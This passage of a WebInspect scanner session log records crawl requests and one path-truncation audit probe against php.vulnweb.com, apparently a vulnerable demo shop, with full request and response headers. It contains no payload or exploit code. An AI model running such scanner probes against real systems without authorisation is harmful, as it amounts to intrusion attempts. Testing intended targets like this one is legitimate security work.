X-Scan-Memo: Category="Crawl";SID="6C4F1E2F262544FF06983A5654F837CA";PSID="D0A7402B83800F606909C145FDDC0FB3";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="d9a29502";
X-Request-Memo: ID="a3dbe519";sc="1";tid="37";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:55 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 100

<div>Thanks for rating <b> Network Storage D-Link DNS-313 enclosure 1 x SATA</b><br><br></div>
				]]></RawResponse><Request id="6C4F1E2F262544FF06983A5654F837CA"><Method>GET</Method><Path>/Mod_Rewrite_Shop/</Path><File>RateProduct-1</File><Ext>html</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="6C4F1E2F262544FF06983A5654F837CA";PSID="D0A7402B83800F606909C145FDDC0FB3";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="d9a29502";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="a3dbe519";sc="1";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<div>Thanks for rating <b> Network Storage D-Link DNS-313 enclosure 1 x SATA</b><br><br></div>
				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:55 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>100</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="4E2E04712D567906D396BAFD1E62CC12"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/RateProduct-2.html</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="4E2E04712D567906D396BAFD1E62CC12"><![CDATA[GET /Mod_Rewrite_Shop/RateProduct-2.html HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="4E2E04712D567906D396BAFD1E62CC12";PSID="6BDEF4BFB9439BD2321C1C813C3137C9";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="1948e753";
X-Request-Memo: ID="344fcceb";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:55 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 76

<div>Thanks for rating <b> Web Camera A4Tech PK-335E</b><br><br></div>
				]]></RawResponse><Request id="4E2E04712D567906D396BAFD1E62CC12"><Method>GET</Method><Path>/Mod_Rewrite_Shop/</Path><File>RateProduct-2</File><Ext>html</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="4E2E04712D567906D396BAFD1E62CC12";PSID="6BDEF4BFB9439BD2321C1C813C3137C9";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="1948e753";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="344fcceb";sc="1";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<div>Thanks for rating <b> Web Camera A4Tech PK-335E</b><br><br></div>
				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:55 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>76</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="BA31779DAB14A79CD812E387710EB2DB"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/BuyProduct-3/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="BA31779DAB14A79CD812E387710EB2DB"><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-3/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="BA31779DAB14A79CD812E387710EB2DB";PSID="C5108DB0FA7ED2396B7E31B5E4BABFC9";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="2fb36383";
X-Request-Memo: ID="cd852cea";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:55 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 93

<div>Thanks for buying <b> Laser Color Printer HP LaserJet M551dn, A4</b><br><br></div>
				]]></RawResponse><Request id="BA31779DAB14A79CD812E387710EB2DB"><Method>GET</Method><Path>/Mod_Rewrite_Shop/BuyProduct-3/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="BA31779DAB14A79CD812E387710EB2DB";PSID="C5108DB0FA7ED2396B7E31B5E4BABFC9";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="2fb36383";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="cd852cea";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<div>Thanks for buying <b> Laser Color Printer HP LaserJet M551dn, A4</b><br><br></div>
				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:55 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>93</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="05202B132C465427FD70ACBF34138874"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/RateProduct-3.html</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="05202B132C465427FD70ACBF34138874"><![CDATA[GET /Mod_Rewrite_Shop/RateProduct-3.html HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="05202B132C465427FD70ACBF34138874";PSID="C5108DB0FA7ED2396B7E31B5E4BABFC9";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="a3109cd8";
X-Request-Memo: ID="cacc7a52";sc="1";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:55 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 93

<div>Thanks for rating <b> Laser Color Printer HP LaserJet M551dn, A4</b><br><br></div>
				]]></RawResponse><Request id="05202B132C465427FD70ACBF34138874"><Method>GET</Method><Path>/Mod_Rewrite_Shop/</Path><File>RateProduct-3</File><Ext>html</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="05202B132C465427FD70ACBF34138874";PSID="C5108DB0FA7ED2396B7E31B5E4BABFC9";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="Relative";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="a3109cd8";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="cacc7a52";sc="1";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<div>Thanks for rating <b> Laser Color Printer HP LaserJet M551dn, A4</b><br><br></div>
				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:55 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>93</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="7E5868DF25B3500324DE1088D5FB82C4"><URL>http://php.vulnweb.com:80/hpp/params.php?p=valid&amp;pp=12</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="7E5868DF25B3500324DE1088D5FB82C4"><![CDATA[GET /hpp/params.php?p=valid&pp=12 HTTP/1.1
Referer: http://php.vulnweb.com/hpp/?pp=12
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="7E5868DF25B3500324DE1088D5FB82C4";PSID="E0CFF3E541D0BBC6B753F7FE5A134428";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="5aba4d3b";
X-Request-Memo: ID="9ea5b4f4";sc="1";tid="37";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:56 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 7

valid12]]></RawResponse><Request id="7E5868DF25B3500324DE1088D5FB82C4"><Method>GET</Method><Path>/hpp/</Path><File>params</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>p=valid&amp;pp=12</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>p</Name><Value>valid</Value></Query><Query><Name>pp</Name><Value>12</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/hpp/?pp=12</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="7E5868DF25B3500324DE1088D5FB82C4";PSID="E0CFF3E541D0BBC6B753F7FE5A134428";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="5aba4d3b";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="9ea5b4f4";sc="1";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[valid12]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:56 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>7</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="DFCFD1DC601833F3765C09788118E19A"><URL>http://php.vulnweb.com:80/hpp/params.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="DFCFD1DC601833F3765C09788118E19A"><![CDATA[GET /hpp/params.php HTTP/1.1
Referer: http://php.vulnweb.com/hpp/params.php?aaaa%2f=12345
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="DFCFD1DC601833F3765C09788118E19A";PSID="5C4B297B2577082A4B7D09B5A936C166";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="67";tt="11";
X-RequestManager-Memo: sid="39";smi="0";sc="1";ID="9eeeb847";
X-Request-Memo: ID="3ac250c5";sc="1";tid="45";
Cookie: CustomCookie=WebInspect0;login=test%2Ftest

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:51 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5

0

]]></RawResponse><Request id="DFCFD1DC601833F3765C09788118E19A"><Method>GET</Method><Path>/hpp/</Path><File>params</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0;login=test%2Ftest
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/hpp/params.php?aaaa%2f=12345</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="DFCFD1DC601833F3765C09788118E19A";PSID="5C4B297B2577082A4B7D09B5A936C166";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="67";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="39";smi="0";sc="1";ID="9eeeb847";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="3ac250c5";sc="1";tid="45";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie><Cookie><Name>login</Name><Value>test%2Ftest</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[0

]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:51 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="5C4B297B2577082A4B7D09B5A936C166"><URL>http://php.vulnweb.com:80/hpp/params.php?aaaa%2f=12345</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="5C4B297B2577082A4B7D09B5A936C166"><![CDATA[GET /hpp/params.php?aaaa%2f=12345 HTTP/1.1
Referer: http://php.vulnweb.com/hpp/?pp=12
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="5C4B297B2577082A4B7D09B5A936C166";PSID="E0CFF3E541D0BBC6B753F7FE5A134428";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="56f925f4";
X-Request-Memo: ID="73202811";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:56 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5

0

]]></RawResponse><Request id="5C4B297B2577082A4B7D09B5A936C166"><Method>GET</Method><Path>/hpp/</Path><File>params</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>aaaa%2f=12345</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>aaaa%2f</Name><Value>12345</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/hpp/?pp=12</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="5C4B297B2577082A4B7D09B5A936C166";PSID="E0CFF3E541D0BBC6B753F7FE5A134428";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="56f925f4";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="73202811";sc="1";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[0

